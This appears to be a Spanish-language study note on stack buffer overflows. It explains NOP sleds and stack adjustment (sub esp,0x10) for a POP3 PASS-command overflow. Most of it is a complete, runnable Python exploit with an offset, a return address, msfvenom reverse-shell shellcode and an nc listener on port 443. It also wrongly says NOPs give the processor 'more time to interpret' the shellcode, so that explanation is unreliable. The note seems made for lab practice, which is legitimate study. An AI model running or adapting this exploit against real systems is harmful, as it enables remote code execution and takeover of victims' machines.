--- 
- Tags: #NOPs #RCE #shellcode 
----
# Explicación

Una vez que se ha encontrado la dirección del opcode que aplica el salto al registro **ESP**, es posible que el shellcode no sea interpretado correctamente debido a que su ejecución puede requerir más tiempo del que el procesador tiene disponible antes de continuar con la siguiente instrucción del programa.
Para solucionar este problema, se suelen utilizar técnicas como la introducción de **NOPS** (**instrucciones de no operación**) antes del shellcode en la pila. 

> Los **NOPS** no realizan ninguna operación, pero permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.

Otra técnica que se suele utilizar es el **desplazamiento en la pila**, que implica modificar el registro ESP para reservar espacio adicional para el shellcode y permitir que se ejecute sin problemas. Por ejemplo, se puede utilizar la instrucción “**``sub esp, 0x10``**” para desplazar el registro ESP **16 bytes** hacia abajo en la pila y reservar espacio adicional para el shellcode.

# Explicación detallada

Si nosotros intentáramos ejecutar nuestro script mientras en otra consola estamos en escucha con ``nc -nlvp 443`` ya que ese fue el puerto que definimos en nuestro Payload del ``msfvenom``, veríamos que no se establece la conexión a la máquina víctima, por lo tanto para conseguir la conexión aplicaremos el uso de NOPS y de desplazamiento en la pila.

Además de todo esto, otra cosa que se puede hacer es a la hora de crear el Shellcode **controlar el comando que queramos ejecutar**, esto se hace con otro Payload, pero lo veremos en la siguiente sección.

------
## NOPs (``\x90``)

Para permitir que el programa **posea más tiempo para interpretar nuestro Shellcode malicioso** lo que haremos será **modificar nuestro script**, agregándole en la variable ``payload`` entra la suma de ``eip`` (ya que todo lo que siga después del **EIP** irá a la Pila) y ``shellcode`` los **NOPS** que se representan como ``\x90``. Podemos poner la cantidad que queramos, en mi caso le voy a colocar *32 NOPS*, que se escribiría tal que así ``b"\x90*32"``, en el script sería así.

![[BOF 31.png]]

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4bcc6b)

shellcode = (b"\xdd\xc6\xbd\xb7\x06\x6c\xcb\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xdf\x15\x8e\x3e\xe3"
b"\xf2\xcc\xc1\x1b\x03\xb1\x48\xfe\x32\xf1\x2f\x8b\x65\xc1"
b"\x24\xd9\x89\xaa\x69\xc9\x1a\xde\xa5\xfe\xab\x55\x90\x31"
b"\x2b\xc5\xe0\x50\xaf\x14\x35\xb2\x8e\xd6\x48\xb3\xd7\x0b"
b"\xa0\xe1\x80\x40\x17\x15\xa4\x1d\xa4\x9e\xf6\xb0\xac\x43"
b"\x4e\xb2\x9d\xd2\xc4\xed\x3d\xd5\x09\x86\x77\xcd\x4e\xa3"
b"\xce\x66\xa4\x5f\xd1\xae\xf4\xa0\x7e\x8f\x38\x53\x7e\xc8"
b"\xff\x8c\xf5\x20\xfc\x31\x0e\xf7\x7e\xee\x9b\xe3\xd9\x65"
b"\x3b\xcf\xd8\xaa\xda\x84\xd7\x07\xa8\xc2\xfb\x96\x7d\x79"
b"\x07\x12\x80\xad\x81\x60\xa7\x69\xc9\x33\xc6\x28\xb7\x92"
b"\xf7\x2a\x18\x4a\x52\x21\xb5\x9f\xef\x68\xd2\x6c\xc2\x92"
b"\x22\xfb\x55\xe1\x10\xa4\xcd\x6d\x19\x2d\xc8\x6a\x5e\x04"
b"\xac\xe4\xa1\xa7\xcd\x2d\x66\xf3\x9d\x45\x4f\x7c\x76\x95"
b"\x70\xa9\xd9\xc5\xde\x02\x9a\xb5\x9e\xf2\x72\xdf\x10\x2c"
b"\x62\xe0\xfa\x45\x09\x1b\x6d\xaa\x66\x23\xaf\x42\x75\x23"
b"\x2e\x28\xf0\xc5\x5a\x5e\x55\x5e\xf3\xc7\xfc\x14\x62\x07"
b"\x2b\x51\xa4\x83\xd8\xa6\x6b\x64\x94\xb4\x1c\x84\xe3\xe6"
b"\x8b\x9b\xd9\x8e\x50\x09\x86\x4e\x1e\x32\x11\x19\x77\x84"
b"\x68\xcf\x65\xbf\xc2\xed\x77\x59\x2c\xb5\xa3\x9a\xb3\x34"
b"\x21\xa6\x97\x26\xff\x27\x9c\x12\xaf\x71\x4a\xcc\x09\x28"
b"\x3c\xa6\xc3\x87\x96\x2e\x95\xeb\x28\x28\x9a\x21\xdf\xd4"
b"\x2b\x9c\xa6\xeb\x84\x48\x2f\x94\xf8\xe8\xd0\x4f\xb9\x09"
b"\x33\x45\xb4\xa1\xea\x0c\x75\xac\x0c\xfb\xba\xc9\x8e\x09"
b"\x43\x2e\x8e\x78\x46\x6a\x08\x91\x3a\xe3\xfd\x95\xe9\x04"
b"\xd4")

payload = before_eip + eip + b"\x90"*32 + shellcode 


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024) 
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

De esta forma si nos ponemos en escucha y ejecutamos el script conseguiremos acceso a la máquina.

![[BOF 32.png]]
## Desplazamiento en la Pila (``\x83\xEC\x10``)

El próximo método se efectúa aplicando el **Opcode** ``sub esp,0x10``, por lo tanto ejecutaremos la herramienta ``/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`` y colocaremos ``sub esp,0x10``

![[BOF 33.png]]

Esta instrucción lo que hace es **decrementar** el valor del puntero de pila *16 Bytes*, por lo tanto la copiaremos y la pegaremos en la variable ``payload`` entre la suma del ``eip`` y el ``shellcode``

![[BOF 34.png]]

Y si ahora ejecutamos el script mientras estamos en escucha por el *puerto 443* ganaremos acceso a la máquina.

![[BOF 32.png]]